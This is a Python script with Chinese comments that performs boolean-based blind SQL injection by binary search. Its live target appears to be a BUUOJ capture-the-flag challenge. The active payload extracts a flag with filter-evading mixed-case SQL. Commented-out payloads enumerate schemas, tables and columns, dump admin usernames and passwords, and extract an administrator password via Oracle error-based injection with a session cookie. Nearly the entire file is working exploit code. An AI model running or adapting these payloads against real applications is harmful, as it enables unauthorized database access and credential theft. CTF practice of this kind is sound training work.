# 利用二分法进行布尔盲注
import requests
import time

url = "http://7ec8f849-5724-4a21-a669-7aea2891e13b.node4.buuoj.cn:81/?id=TMP11503"
# payload = {
#     "username": "",
#     "password": "123"
# }
result = ""
sign = "TMP11503"
signForError = False
from_asc = 10
to_asc = 130


s = requests.session()
flag = ""
for i in range(1, 100):
    l = from_asc
    r = to_asc
    mid = (l + r) >> 1  # 整除2
    while l < r:
        # 爆破数据库名
        # payload["username"]=f"admin' or ascii(substr(database(),{i},1))>{mid}#"
        # 爆破所有表名
        # payload["username"]=f"admin' or ascii(substr((select(GROUP_CONCAT(table_name))from(information_schema.tables)where(table_schema)='level2'),{i},1))>{mid}#"
        # 从admins表中爆破所有列名
        # payload["username"]=f"admin' or ascii(substr((select(GROUP_CONCAT(column_name))from(information_schema.columns)where(table_name)='admins'),{i},1))>{mid}#"
        # dump
        # payload["username"]=f"admin' or ascii(substr((select(GROUP_CONCAT(username,password SEPARATOR ';'))from(admins)),{i},1))>{mid}#"
        # response = requests.post(url,data=payload,headers={"Cookie":"TrackingId=ZOcRWP7eHH4zarHf' and '1'='1; session=L10rd55fQ5xSMdZSDtYyWxeMqplQUVXR"})
        # payload = f"(SELECT CASE WHEN (ASCII(SUBSTR((select password from users where username = 'administrator'), {i}, 1)) > {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)"
        # (SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')

        # 10.19
        # payload = f"AsCiI(suBsTr(dAtAbAse(),{i},1))>{mid}--+"
        # payload = f"aScIi(sUbStR((sElEcT(GRoUP_COnCaT(tAbLe_nAmE))fRoM(iNfOrMaTiOn_ScHeMa.TaBleS)wHeRe(taBle_scHemA)='ctf'),{i},1))>{mid}--+"
        # payload = f"aScIi(sUbStR((sElEcT(GRoUP_COnCaT(cOlUmN_nAmE))fRoM(iNfOrMaTiOn_ScHeMa.coLuMnS)wHeRe(tAbLe_Name)='here_is_flag'),{i},1))>{mid}--+"
        payload = f"aScIi(sUbStR((sElEcT(GRoUP_COnCaT(flag))fRoM(here_is_flag)),{i},1))>{mid}--+"

        # 检查payload括号是否闭合
        if payload.count("(") != payload.count(")"):
            print("括号不闭合")
            exit()
        print(payload, end=" ")
        response = requests.get(url + "' And " + payload)
        # print(response.text)
        if sign in response.text:
            l = mid + 1
            print("true")
        else:
            r = mid
            # print(response.text)
            print("false")

        mid = (l + r) >> 1
        time.sleep(0.5)
    if mid == from_asc or mid == to_asc:
        print("未匹配字符，是否继续爆破下一个字符？(y/n)")
        condition = input()
        if condition == "y" or condition == "Y":
            ...
        elif condition == "n" or condition == "N":
            break
    print(chr(mid))
    result = result + chr(mid)
print(result)
